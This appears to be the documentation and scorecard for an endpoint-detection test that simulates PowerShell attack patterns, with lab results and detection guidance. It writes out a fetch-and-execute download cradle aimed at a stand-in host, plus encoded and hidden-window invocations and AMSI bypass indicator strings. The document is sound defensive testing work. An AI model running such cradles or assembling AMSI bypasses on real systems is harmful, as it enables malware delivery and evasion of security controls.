# PowerShell Execution & AMSI Detection

## Test Information

**Test ID**: f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01
**Test Name**: PowerShell Execution & AMSI Detection
**Category**: MITRE Top 10 / Execution
**Severity**: High
**MITRE ATT&CK**: T1059.001, T1140

## Description

This test evaluates endpoint detection and response (EDR) capabilities against common PowerShell-based attack patterns that are frequently used in real-world intrusions. PowerShell (T1059.001) consistently ranks among the top techniques observed in threat actor operations, making it a critical detection capability for security teams.

The test simulates four distinct attack patterns:

1. **Base64 Encoded Commands**: Tests the `-EncodedCommand` parameter commonly used to obfuscate malicious payloads
2. **Download Cradle Patterns**: Simulates the ubiquitous `IEX (New-Object Net.WebClient).DownloadString()` pattern
3. **Hidden Window Execution**: Tests detection of `-WindowStyle Hidden` parameter used to hide execution
4. **AMSI Bypass Indicator Detection**: Checks if common AMSI bypass strings are detected

All patterns are designed to be completely safe - they only create harmless marker files to verify execution, with no actual malicious payloads or network connections.

## Test Score: 7.6/10

### Score Breakdown (Rubric v2.1)

Re-scored 2026-11-03 from v1 under the active v2.1 rubric (`docs/PROPOSED_RUBRIC_V2.1_SIGNAL_QUALITY.md`) following the exit-code-integrity and realism remediation on branch `fix/mitre-top10-platform-files`.

| Tier | Sub-dimension | Score | Rationale |
|---|---|---|---|
| **1** | Safety Gate | **PASS** | All writes confined to `LOG_DIR` / `ARTIFACT_DIR`; no real system targets touched; cleanup on every exit path incl. panic and timeout; loopback-only networking except technique-inherent egress to fixed, documented benign public endpoints (see test README). |
| **2a** | API Fidelity (0–2.5) | **1.7** | Real powershell.exe child processes with canonical attacker flags (-ExecutionPolicy Bypass -EncodedCommand (verified UTF-16LE payload), -WindowStyle Hidden) and REAL IEX/WebClient DownloadString cradle command lines. AMSI phase assigns indicator strings to variables rather than executing actual bypass code (intentional safety bound) — the defining deduction from the 2.5 band. |
| **2b** | Identifier Fidelity (0–1.5) | **0.9** | Real PowerShell invocation surface; cradle host is a reserved-TLD domain (authentic syntax, safe by construction). Sandbox marker filenames are generic. |
| **2c** | Telemetry Signal Quality (0–2) | **1.8** | Lab-verified 2026-11-03 (exit 101, 3/3 executable patterns ran, AMSI 0/4). Signal richness ✅ (process creation + command-line + AMSI scan surfaces). Sensor mapping ✅ (Detection Opportunities section). Rule artifacts parse ✅. Optional-tool phases: none. |
| **2d** | Execution-Context Fidelity (0–1) | **0.6** | Admin context probed at runtime and gates denial classification; user-context runs produce user-shaped telemetry. No deeper context branching. |
| **3a** | Schema & Metadata (0–1) | **1.0** | Schema v2.0 InitLogger + complete metadata header (incl. SOURCE_URL) + org UUID resolution + Authenticode-signed binary. RubricVersion: v2.1. |
| **3b** | Documentation Completeness (0–1) | **1.0** | README + info.md (this v2.1 scorecard + lab-evidence block) + references.md present; `utils/validate-score-format.sh` passes; MITRE mapping cites official technique/sub-technique IDs. |
| **3c** | Logging & Plumbing (0–0.5) | **0.3** | test_logger v2.0 + per-child stdout/stderr tee persisted to `LOG_DIR/<name>_output.txt`. Monolithic single-stage test: no per-stage `bundle_results.json` and no pre/post system snapshots (the two omissions from the 0.5 band). |
| **3d** | Operational Hygiene (0–0.5) | **0.25** | Orchestrator 5.9 MB (< 25 MB) ✅; global watchdog enforces the documented budget ✅; `Endpoint.Stop()` exits within seconds on every code path ✅; per-phase time budgets not tabulated ❌; no per-hang-risk-phase watchdogs beyond the global one ⚠️. |
|  | **Total** | **7.6 / 10** | Realism: 5.00 / 7.00. Structure: 2.55 / 3.00. Lab-verified 2026-11-03 (win lab, Sophos Intercept X). |

### Lab Execution Evidence (2026-11-03)

Executed end-to-end on the `win` lab (Windows 11 Pro, Sophos Intercept X active, Defender disabled) with exit-code capture: **exit 101 — encoded/hidden/cradle patterns all executed; AMSI indicator strings not flagged by Sophos.** The 2c hard cap (1.5 without lab execution) is therefore lifted for this test.

### Key Strengths

1. **High Real-World Relevance**: T1059.001 (PowerShell) is consistently in the MITRE ATT&CK Top 10 most observed techniques
2. **Multiple Detection Patterns**: Tests 4 distinct attack patterns, providing comprehensive coverage
3. **Safe by Design**: All commands create marker files only - no actual malicious behavior
4. **Native Test**: No embedded binaries or external tools required
5. **AMSI Integration Testing**: Validates that AMSI scanning is properly functioning
6. **Clear Pass/Fail Criteria**: Outcome determined by whether patterns are blocked

### Improvement Opportunities

1. Could add PowerShell Constrained Language Mode detection
2. Could include AppLocker/WDAC bypass pattern testing
3. Could add PowerShell remoting detection patterns

## Technical Details

### Attack Flow

1. **Phase 1: Initialization**
   - Verify PowerShell availability
   - Create target directory `c:\F0`
   - Initialize Schema v2.0 logging

2. **Phase 2: Base64 Encoded Command**
   - Execute: `powershell.exe -ExecutionPolicy Bypass -EncodedCommand <base64>`
   - Encoded command creates: `c:\F0\marker_encoded.txt`
   - Detection: Process creation, command-line arguments

3. **Phase 3: Download Cradle Pattern**
   - Execute REAL cradle command lines against a reserved-TLD host (`http://cdn-updates.f0rtika-lab.test/p.ps1`) that never resolves
   - Patterns: `IEX (New-Object Net.WebClient).DownloadString('...')` and `$c = New-Object System.Net.WebClient; $c.DownloadString('...')`
   - Detection: command-line content, AMSI script scan, DNS attempt telemetry; retrieval failure is expected-benign by design

4. **Phase 4: Hidden Window Execution**
   - Execute: `powershell.exe -WindowStyle Hidden -Command "..."`
   - Creates: `c:\F0\marker_hidden.txt`
   - Detection: Command-line arguments, process creation

5. **Phase 5: AMSI Pattern Detection**
   - Test AMSI bypass indicator strings in PowerShell variables
   - Patterns: `AmsiScanBuffer`, `amsiInitFailed`, etc.
   - Creates: `c:\F0\amsi_pattern_results.txt`
   - Detection: AMSI scanning, content-based detection

6. **Phase 6: Final Assessment**
   - Evaluate results from all phases
   - Generate summary report
   - Determine protection status
   - Cleanup test artifacts

### Key Indicators

**Process Creation:**
- `powershell.exe` with `-EncodedCommand` or `-enc` flag
- `powershell.exe` with `-WindowStyle Hidden`
- `powershell.exe` with `-ExecutionPolicy Bypass`

**Command Line Patterns:**
- Base64-encoded strings following `-EncodedCommand`
- Download cradle patterns: `Net.WebClient`, `DownloadString`, `IEX`
- Hidden execution: `-WindowStyle Hidden`, `-NonInteractive`

**AMSI Patterns:**
- `AmsiScanBuffer` - function used in most AMSI bypasses
- `amsiInitFailed` - variable used to track AMSI state
- `System.Management.Automation.AmsiUtils` - reflection target

**File System:**
- Rapid file creation in `c:\F0` directory
- Marker files with `F0RT1KA-*` content

## Detection Opportunities

1. **Process Creation Monitoring**
   - Alert on `powershell.exe` with suspicious command-line arguments
   - Monitor for encoded commands, hidden windows, bypass policies
   - Track parent-child process relationships

2. **Script Block Logging**
   - Enable PowerShell script block logging (Event ID 4104)
   - Capture decoded script content regardless of obfuscation
   - Detect suspicious patterns in script blocks

3. **AMSI Integration**
   - Ensure AMSI is enabled and functioning
   - Monitor for AMSI bypass attempts
   - Alert on detection of bypass indicator strings

4. **Command Line Analysis**
   - Decode base64-encoded commands for analysis
   - Detect download cradle patterns
   - Identify suspicious parameter combinations

5. **Behavioral Analysis**
   - Monitor file creation patterns
   - Detect rapid marker file creation
   - Correlate PowerShell execution with file operations

## Expected Results

### Unprotected System (Code 101)

When the system is unprotected:
- All four PowerShell patterns execute successfully
- Marker files are created in `c:\F0`:
  - `marker_encoded.txt`
  - `marker_download.txt`
  - `marker_hidden.txt`
- AMSI patterns are not detected
- Test summary shows all patterns as "VULNERABLE"

### Protected System (Code 126)

When the system has active protection:
- At least one pattern is blocked by EDR/AV
- Blocking may occur at various stages:
  - Process creation blocked
  - Command execution prevented
  - AMSI scans content and blocks
- Test summary shows blocked patterns

### Prerequisites Not Met (Code 999)

When PowerShell is unavailable:
- Test exits early with code 999
- This is not a security result, just environmental

### Script Quarantined (Code 105)

Not emitted by this test — there is no quarantine-detection path (no embedded binaries or script files are extracted). Valid exit codes: 126 (protection evidence), 101 (patterns executed), 999 (test error), 102 (timeout).

## Build Instructions

```bash
# Build the test
cd /home/jimx/F0RT1KA/f0_library
./utils/gobuild build tests_source/mitre-top10/f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01/

# Sign the binary
./utils/codesign sign build/f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01/f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01.exe

# Or use combined build-sign command
/build-sign-test f3d7a2b1-8c4e-4f5a-9d6b-1e2f3a4b5c01
```

## References

- [MITRE ATT&CK T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)
- [Microsoft AMSI Documentation](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/learn/security-features)
- [Atomic Red Team - PowerShell Tests](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md)

## Version History

| Version | Date | Changes |
|---------|------|---------|
| 1.0.0 | 2026-01-11 | Initial release with 4 PowerShell attack patterns |
